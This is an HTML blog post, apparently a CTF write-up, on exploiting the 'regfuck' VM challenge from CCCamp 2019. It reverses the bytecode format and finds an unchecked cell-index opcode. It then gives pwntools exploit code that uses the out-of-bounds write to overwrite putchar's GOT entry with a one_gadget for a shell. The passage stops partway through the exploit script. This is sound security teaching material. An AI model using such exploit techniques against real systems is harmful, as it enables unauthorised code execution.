@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>CCCamp 2019 CTF - regfuck | kileak</title>
+
+
+
+
+
+<meta name="description" content="CCCamp 2019 CTF - regfuck">
+
+
+<meta name="keywords" content="ccc, regfuck">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2019/ccccamp-regfuck/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">CCCamp 2019 CTF - regfuck</h1>
+      <p class="post-meta">Aug 24, 2019</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Points: 320 Solves: 9
+<!--break--></p>
+
+  <p>regfuck<br />
+Category: Pwn<br />
+Difficulty: Medium/Hard<br />
+Author: localo<br />
+First Blood: RedGKFRocket<br />
+Show all teams (9)<br /></p>
+
+  <p>Unlimited free Hello Worlds at hax.allesctf.net:3301.</p>
+
+  <p>Ubuntu 18.04</p>
+
+  <p>Note: The server is LD_PRELOADing buffer_read.so to mitigate a short read. You can ping us on IRC if this causes issues with your exploit.</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/ccccamp19/regfuck/vm">vm</a> <a href="https://kileak.github.io/assets/ccccamp19/regfuck/buffer_read.so">buffer_read.so</a> <a href="https://kileak.github.io/assets//ccccamp19/regfuck/libc.so.6">libc.so.6</a> <a href="https://kileak.github.io/assets//ccccamp19/regfuck/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"> ______ _______ _______ _______ _______ ______ __  __ 
+|   __ \    ___|     __|    ___|   |   |      |  |/  |
+|      &lt;    ___|    |  |    ___|   |   |   ---|     &lt; 
+|___|__|_______|_______|___|   |_______|______|__|\__|
+by localo
+
+usage: just push your payload to stdin..</code></pre></figure>
+
+<p>regfuck was a brainfuck-like “mini vm”, which allowed moving a cell pointer, increasing, decreasing values and some basic branching.</p>
+
+<p>Like most bf challenges it had an OOB vulnerability, that would allow us to overwrite got entries and thus gaining a shell.</p>
+
+<p>The first challenge was to understand, how our code would be parsed and what we could do with it.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">data_size</span><span class="p">;</span> 
+  <span class="kt">int</span> <span class="n">program_size</span><span class="p">;</span> 
+  <span class="kt">char</span> <span class="o">*</span><span class="n">data_region</span><span class="p">;</span> 
+  <span class="kt">char</span> <span class="o">*</span><span class="n">code_region</span><span class="p">;</span> 
+  
+  <span class="n">puts</span><span class="p">(</span>
+    <span class="s">" ______ _______ _______ _______ _______ ______ __  __ </span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"|   __ </span><span class="se">\\</span><span class="s">    ___|     __|    ___|   |   |      |  |/  |</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"|      &lt;    ___|    |  |    ___|   |   |   ---|     &lt; </span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"|___|__|_______|_______|___|   |_______|______|__|</span><span class="se">\\</span><span class="s">__|</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"by localo</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"usage: just push your payload to stdin..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+  <span class="c1">// Read size for data region</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data_size</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">data_size</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="c1">// Read size for code region </span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">program_size</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">program_size</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">program_size</span> <span class="o">&amp;</span> <span class="mi">7</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="c1">// map memory for data + code region</span>
+  <span class="n">data_region</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="mh">0x405000</span><span class="p">,</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">data_size</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">program_size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">data_region</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+  <span class="c1">// Set pointer for code region inside mapped area</span>
+  <span class="n">code_region</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">data_region</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">data_size</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)];</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">code_region</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="c1">// Read the program bytecode</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">code_region</span><span class="p">,</span> <span class="n">program_size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>
+
+  <span class="c1">// Start execution</span>
+  <span class="k">return</span> <span class="n">execute_program</span><span class="p">(</span><span class="n">data_region</span><span class="p">,</span> <span class="n">data_size</span><span class="p">,</span> <span class="n">code_region</span><span class="p">,</span> <span class="n">program_size</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>So, it reads 4 bytes for the <code class="language-plaintext highlighter-rouge">data_size</code> (used for storing cell values), 4 bytes for <code class="language-plaintext highlighter-rouge">program_size</code> (size of our code in bytes) and creates a memory region for our vm context (data + program).</p>
+
+<p>Here’s the first caveat: While starting exploits, I’ll often disable ASLR to make debugging easier, not having to fiddle around with changing memory addresses. This is a <em>very</em> bad idea to do here ;-)</p>
+
+<p>If ASLR is disabled, the heap will be allocated at <code class="language-plaintext highlighter-rouge">0x405000</code> and thus <code class="language-plaintext highlighter-rouge">mmap</code> will allocate a new region (for example at <code class="language-plaintext highlighter-rouge">0x7ffff7dc8000</code>), which will make it impossible to exploit it (or at least way harder than needed).</p>
+
+<p>With ASLR enabled, heap will be allocated at some random address, allowing <code class="language-plaintext highlighter-rouge">mmap</code> to create the region exactly at <code class="language-plaintext highlighter-rouge">0x405000</code>, which is perfectly aligned to <code class="language-plaintext highlighter-rouge">bss</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  vmmap
+Start              End                Offset             Perm Path
+0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/kileak/ctf/alles/regfuck/regfuck/vm
+0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/kileak/ctf/alles/regfuck/regfuck/vm
+0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /home/kileak/ctf/alles/regfuck/regfuck/vm
+0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /home/kileak/ctf/alles/regfuck/regfuck/vm
+0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/kileak/ctf/alles/regfuck/regfuck/vm
+0x0000000000405000 0x0000000000406000 0x0000000000000000 rw- # VM context region
+0x0000000000eee000 0x0000000000f0f000 0x0000000000000000 rw- [heap]</code></pre></figure>
+
+<p>This will become important later on, but let’s first continue to analyze how to provide executable code to the vm.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">VM_Context</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">OP_Code</span><span class="p">;</span>          <span class="c1">// Current opcode to execute</span>
+  <span class="kt">int</span> <span class="n">Accumulator</span><span class="p">;</span>      <span class="c1">// Temporary storage</span>
+  <span class="kt">int</span> <span class="n">Cells</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>         <span class="c1">// Cells usable by vm</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">execute_program</span><span class="p">(</span><span class="n">VM_Context</span><span class="o">*</span> <span class="n">data_region</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">code_region</span><span class="p">,</span> <span class="kt">int</span> <span class="n">opcode_count</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">time_t</span> <span class="n">timer</span><span class="p">;</span> 
+  <span class="kt">time_t</span> <span class="n">timer_opcode</span><span class="p">;</span>   
+  <span class="kt">int</span> <span class="n">vm_eip</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">time</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer</span><span class="p">);</span>
+
+  <span class="k">while</span> <span class="p">(</span> <span class="n">opcode_count</span> <span class="o">&gt;</span> <span class="n">vm_ip</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">time</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer_opcode</span><span class="p">);</span>
+
+    <span class="c1">// Break code execution after 2 seconds (nasty for debugging)</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">timer_opcode</span> <span class="o">-</span> <span class="n">timer</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span> 
+      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+
+    <span class="c1">// Process current opcode at vm_eip </span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">process_code</span><span class="p">(</span><span class="n">data_region</span><span class="p">,</span> <span class="n">code_region</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vm_ip</span><span class="p">)</span> <span class="p">)</span>
+      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+
+    <span class="c1">// Increase instruction pointer</span>
+    <span class="o">++</span><span class="n">vm_ip</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The timer checks are a bit nasty, when debugging this, since it will break execution when doing break &amp; continue (except you’re fast enough to debug everything in 2 seconds :-P). I just patched the binary to ignore the condition making debugging a lot easier.</p>
+
+<p>Apart from this, this will just initialiaze an index variable (let’s call it vm instruction pointer), calling repeatedly <code class="language-plaintext highlighter-rouge">process_code</code> (passing <code class="language-plaintext highlighter-rouge">vm_ip</code> also as a reference, so the code could update it when branching).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">process_code</span><span class="p">(</span><span class="n">VM_Context</span> <span class="o">*</span><span class="n">data_region</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">code_region</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">ptr_vm_ip</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">vm_ip</span><span class="p">;</span> 
+
+  <span class="c1">// Get current vm instruction pointer  </span>
+  <span class="n">vm_ip</span> <span class="o">=</span> <span class="o">*</span><span class="n">ptr_vm_ip</span><span class="p">;</span>
+  
+  <span class="k">if</span> <span class="p">(</span> <span class="n">vm_ip</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+    <span class="n">vm_ip</span> <span class="o">=</span> <span class="o">*</span><span class="n">ptr_vm_ip</span> <span class="o">+</span> <span class="mi">7</span><span class="p">;</span>
+
+  <span class="c1">// Check if bit at vm_ip is set</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">code_region</span><span class="p">[</span><span class="n">vm_ip</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">7</span> <span class="o">-</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr_vm_ip</span> <span class="o">%</span> <span class="mi">8</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="c1">// Increase opcode cell</span>
+    <span class="o">++</span><span class="n">data_region</span><span class="o">-&gt;</span><span class="n">OP_Code</span><span class="p">;</span>                             
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">data_region</span><span class="o">-&gt;</span><span class="n">OP_Code</span> <span class="o">&lt;=</span> <span class="mi">9</span> <span class="p">)</span>
+      <span class="n">OP_CODE_TABLE</span><span class="p">[</span><span class="n">data_region</span><span class="o">-&gt;</span><span class="n">OP_Code</span><span class="p">]();</span>
+
+    <span class="n">data_region</span><span class="o">-&gt;</span><span class="n">OP_Code</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>So, our instruction pointer is basically a bit offset in our code, and <code class="language-plaintext highlighter-rouge">process_code</code> will check if the bit at the current ip is set to <code class="language-plaintext highlighter-rouge">1</code> or <code class="language-plaintext highlighter-rouge">0</code>. When the bit is set, it will increase <code class="language-plaintext highlighter-rouge">OP_Code</code>, and if the bit is not set, it will use the current value in <code class="language-plaintext highlighter-rouge">OP_Code</code> to find the offset in <code class="language-plaintext highlighter-rouge">OP_CODE_TABLE</code>, execute the corresponding opcode and reset <code class="language-plaintext highlighter-rouge">OP_Code</code> back to 0 (start reading the next opcode).</p>
+
+<p>There will be 9 instructions available. Thus to execute different opcodes, we have to create a “bit stream”, with <code class="language-plaintext highlighter-rouge">n</code> following bits set to <code class="language-plaintext highlighter-rouge">1</code> and a stop <code class="language-plaintext highlighter-rouge">0</code> bit for executing <code class="language-plaintext highlighter-rouge">OPCODE(n)</code>.</p>
+
+<p>Basic starter script:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"hax.allesctf.net"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">3301</span>
+
+<span class="k">def</span> <span class="nf">op</span><span class="p">(</span><span class="n">opcode</span><span class="p">):</span>
+    <span class="c1"># create "binary stream" ;)
+</span>    <span class="n">result</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
+    <span class="n">result</span> <span class="o">+=</span> <span class="n">opcode</span><span class="o">*</span><span class="s">"1"</span>
+    <span class="n">result</span> <span class="o">+=</span> <span class="s">"0"</span>
+    <span class="k">return</span> <span class="n">result</span>
+
+<span class="k">def</span> <span class="nf">convertprogram</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+    <span class="c1"># convert binary representation to bytes
+</span>    <span class="n">result</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
+
+    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mi">2</span><span class="p">))</span>
+    
+    <span class="k">return</span> <span class="n">result</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">op</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>  
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">op</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>  
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">op</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>  
+    
+    <span class="c1"># convert binary to byte data
+</span>    <span class="n">data</span> <span class="o">=</span> <span class="n">convertprogram</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="c1"># create program header
+</span>    <span class="n">program</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+    <span class="n">program</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">program</span> <span class="o">+=</span> <span class="n">data</span>
+    
+    <span class="c1"># send program to servivce
+</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">program</span><span class="p">)</span>
+    
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+    <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vm"</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./vm"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span><span class="s">"./buffer_read.so"</span><span class="p">})</span>
+        <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>With this, we can start writing vm code and execute the different available opcodes.</p>
+
+<p>Won’t be getting too much into detail of reversing the opcodes itself, but as a short explanation:</p>
+
+<ul>
+  <li>1 : Increase current cell index (<code class="language-plaintext highlighter-rouge">0x40123b</code>)</li>
+  <li>2 : Decrease current cell index (<code class="language-plaintext highlighter-rouge">0x40126f</code>)</li>
+  <li>3 : Increase value at current cell (<code class="language-plaintext highlighter-rouge">0x40129e</code>)</li>
+  <li>4 : Decrease value at current cell (<code class="language-plaintext highlighter-rouge">0x4012c8</code>)</li>
+  <li>5 : Jump to IP stored in accumulator if current value &gt; 0 (<code class="language-plaintext highlighter-rouge">0x4012f2</code>)</li>
+  <li>6 : Move value at current cell into accumulator (<code class="language-plaintext highlighter-rouge">0x401335</code>)</li>
+  <li>7 : putchar (current cell) (<code class="language-plaintext highlighter-rouge">0x401364</code>)</li>
+  <li>8 : Store current IP and Index array in current cell (<code class="language-plaintext highlighter-rouge">0x40138d</code>)</li>
+  <li>9 : Restore current cell index from value in accumulator (<code class="language-plaintext highlighter-rouge">0x4013c9</code>)</li>
+</ul>
+
+<p>Calling function 8, will store the current instruction pointer in the upper 2 bytes of the current cell and the current cell index in the lower 2 bytes.</p>
+
+<p>Interesting parts</p>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">decrease_current_cell_idx:
+mov     rax, [rbp+current_array_idx] 
+movzx   eax, word ptr [rax] 
+cmp     ax, 0FFFFh      
+jnz     short do_decrease
+mov     eax, 1
+jmp     leave_process_code
+
+do_decrease:                         
+mov     rax, [rbp+current_array_idx] 
+movzx   eax, word ptr [rax] 
+sub     eax, 1         
+mov     edx, eax
+mov     rax, [rbp+current_array_idx]
+mov     [rax], dx
+jmp     continue_execution</code></pre></figure>
+
+<p>There is a basic boundary check, when decreasing the current cell index, as it will validate, that the current cell index does not equal <code class="language-plaintext highlighter-rouge">0xffff</code> (<code class="language-plaintext highlighter-rouge">-1</code>). 
+If cell index is <code class="language-plaintext highlighter-rouge">-1</code>, program execution will be aborted, so we cannot just decrease our way into <code class="language-plaintext highlighter-rouge">bss</code>.</p>
+
+<p>But the boundaries won’t be checked in the “set array index function”. Thus we can move outside of the boundaries of our vm context, by first decreasing a cell value to a negative value, storing it in the accumulator, and then calling “set array index”, which will directly set the array index to the negative value (and as long as it doesn’t equals <code class="language-plaintext highlighter-rouge">-1</code>, we’re good to go).</p>
+
+<p>Armed with this, I wrote a script to “walk” into <code class="language-plaintext highlighter-rouge">got</code>, and “decreased” <code class="language-plaintext highlighter-rouge">putchar.got</code> to point to a <code class="language-plaintext highlighter-rouge">one_gadget</code>. In CTF ghetto style, I only did as much as needed to write exactly that value to the got entry, which on the one hand worked and resulted in getting a local shell…</p>
+
+<p>But well… failed miserably at the remote service, most likely due to a different stack layout.</p>
+
+<p>Since my regfuck code at that point was even harder to read, than it was to write, every change in it just broke everything. While messing around with the script, it got quite late and I needed some sleep, so I called it a day…</p>
+
+<p>Next morning, I just dropped everything and started from scratch again (though ending up in the end with the same script as the day before, but at least understanding again, what I was doing ;)).</p>
+
+<p>While it seemed, that we could write an almost arbitrary size of vm code, only walking to the got entry and decreasing it 23894482 times (totally random value) seemed to break code execution, so I had to come up with a proper code including some counter variables.</p>
+
+<p>Plan:</p>
+
+<ul>
+  <li>
+    <ol>
+      <li>Create a negative value in a cell (so it would point below <code class="language-plaintext highlighter-rouge">got</code> table)</li>
+    </ol>
+  </li>
+  <li>
+    <ol>
+      <li>Move it to the accumulator</li>
+    </ol>
+  </li>
+  <li>
+    <ol>
+      <li>Set the array index to accumulator (which now holds our forged negative index in the lower 2 bytes and thus moved the array index backwards)</li>
+    </ol>
+  </li>
+  <li>
+    <ol>
+      <li>Move one cell up and write a <code class="language-plaintext highlighter-rouge">multiplicator</code> value there</li>
+    </ol>
+  </li>
+  <li>
+    <ol>
+      <li>Move back and store the current instruction pointer (and current cell value) to this cell</li>
+    </ol>
+  </li>
+  <li>
+    <ol>
+      <li>Reset index array (it will still point to the same cell at this point, but this is needed for making the loop work)</li>
+    </ol>
+  </li>
+  <li>
+    <ol>
+      <li>Move cell pointer to our destination address (<code class="language-plaintext highlighter-rouge">putchar.got</code>)</li>
+    </ol>
+  </li>
+  <li>
+    <ol>
+      <li>Increase/Decrease it by a <code class="language-plaintext highlighter-rouge">factor</code> value</li>
+    </ol>
+  </li>
+  <li>
+    <ol>
+      <li>Move back to our multiplicator value and decrease it by 1</li>
+    </ol>
+  </li>
+  <li>
+    <ol>
+      <li>Do a “jump if not zero” (on <code class="language-plaintext highlighter-rouge">multiplicator</code>) back to the stored instruction pointer (<code class="language-plaintext highlighter-rouge">6</code>) from the accumulator (The cell index is now pointing to the <code class="language-plaintext highlighter-rouge">multiplicator</code> cell and not the instruction pointer cell, as it was, when the loop was executed the first time. That’s the reason we’ll reset the array index in <code class="language-plaintext highlighter-rouge">6</code>, so the state is the same for every loop)</li>
+    </ol>
+  </li>
+  <li>
+    <ol>
+      <li>When we finished increasing/decreasing the value <code class="language-plaintext highlighter-rouge">m</code> * <code class="language-plaintext highlighter-rouge">f</code> times, we once again walk back to the destination address and increase/decrease it by the <code class="language-plaintext highlighter-rouge">remaining</code> value</li>
+    </ol>
+  </li>
+  <li>
+    <ol>
+      <li>Go back into initial state (for starting more writes, which weren’t needed in the end)</li>
+    </ol>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">write_value</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">org_address</span><span class="p">,</span> <span class="n">dest_address</span><span class="p">,</span> <span class="n">rbp_off</span><span class="o">=</span><span class="mh">0x68</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">org_address</span> <span class="o">&gt;</span> <span class="n">dest_address</span><span class="p">:</span>
+        <span class="n">mult</span><span class="p">,</span> <span class="n">factor</span><span class="p">,</span> <span class="n">remaining</span> <span class="o">=</span> <span class="n">get_factors</span><span class="p">(</span><span class="n">org_address</span> <span class="o">-</span> <span class="n">dest_address</span><span class="p">)</span>
+        <span class="n">increase</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">mult</span><span class="p">,</span> <span class="n">factor</span><span class="p">,</span> <span class="n">remaining</span> <span class="o">=</span> <span class="n">get_factors</span><span class="p">(</span><span class="n">dest_address</span> <span class="o">-</span> <span class="n">org_address</span><span class="p">)</span>
+        <span class="n">increase</span> <span class="o">=</span> <span class="mi">1</span>
+
+    <span class="k">return</span> <span class="n">change_val</span><span class="p">(</span><span class="n">mult</span><span class="p">,</span> <span class="n">factor</span><span class="p">,</span> <span class="n">remaining</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">rbp_off</span><span class="p">,</span> <span class="n">increase</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">change_val</span><span class="p">(</span><span class="n">mult</span><span class="p">,</span> <span class="n">factor</span><span class="p">,</span> <span class="n">remaining</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">rbp_off</span><span class="o">=</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">increase</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+
+    <span class="c1"># 1. move to "offset" index for current chain  
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">decval</span><span class="p">((</span><span class="mh">0x405008</span> <span class="o">-</span> <span class="mh">0x404000</span> <span class="o">-</span> <span class="n">rbp_off</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span>
+
+    <span class="c1"># 2. move to accumulator
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">movacc</span><span class="p">()</span>
+
+    <span class="c1"># 3. Set array idx from acc (now pointing below got)
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">setarrayidx</span><span class="p">()</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">incidx</span><span class="p">()</span>
+
+    <span class="c1"># 4. write multipllicator
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">incval</span><span class="p">(</span><span class="n">mult</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">decidx</span><span class="p">()</span>
+
+    <span class="c1"># 5. store label
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">storeeip</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
